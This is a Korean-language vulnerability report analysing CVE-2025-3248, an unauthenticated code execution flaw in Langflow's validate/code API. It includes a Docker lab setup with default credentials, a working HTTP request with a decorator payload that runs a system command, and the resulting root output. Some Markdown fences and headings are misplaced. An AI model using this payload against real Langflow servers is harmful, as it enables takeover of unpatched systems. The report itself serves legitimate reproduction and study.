# CVE-2025-3248 Langflow `validate/code` API 인증 우회 원격 코드 실행 취약점 분석 보고서

## 개요

본 보고서는 Langflow 1.2.0 버전 이하에서 발생하는 인증 우회 원격 코드 실행(Remote Code Execution, RCE) 취약점(CVE-2025-3248)에 대해 분석하고, Docker 환경에서 재현(PoC)한 결과를 문서화한 것입니다.

취약점은 `/api/v1/validate/code` 엔드포인트에서 사용자로부터 전달된 Python 코드를 `exec()` 함수를 통해 실행할 때 발생합니다. 함수 정의 시 실행되는 decorator 또는 default argument 표현식을 악용해 인증 없이 임의의 명령어를 실행할 수 있습니다.

---

## 취약점 정보

| 항목 | 내용 |
|------|------|
| CVE 번호 | CVE-2025-3248 |
| 영향받는 제품 | Langflow < 1.3.0 |
| 취약점 유형 | 인증 우회 원격 코드 실행 (Pre-auth RCE) |
| 취약점 위치 | `/api/v1/validate/code` |
| 심각도 | ★ Critical |
| 공식 패치 | [v1.3.0 릴리즈](https://github.com/langflow-ai/langflow/releases/tag/1.3.0) |

---

## 실습 환경 구성

```bash
git clone https://github.com/내아이디/vulhub.git
cd vulhub/langflow/CVE-2025-3248
docker compose up -d

접속 주소: http://localhost:7860

기본 계정: administrator / vulhub

Burp Suite 요청

POST /api/v1/validate/code HTTP/1.1
Host: localhost:7860
Content-Type: application/json

{
  "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
}

```

## 실습 환경 구성

```bash
{
  "function": {
    "errors": [
      "b'uid=0(root) gid=0(root) groups=0(root)\\n'"
    ]
  }
}
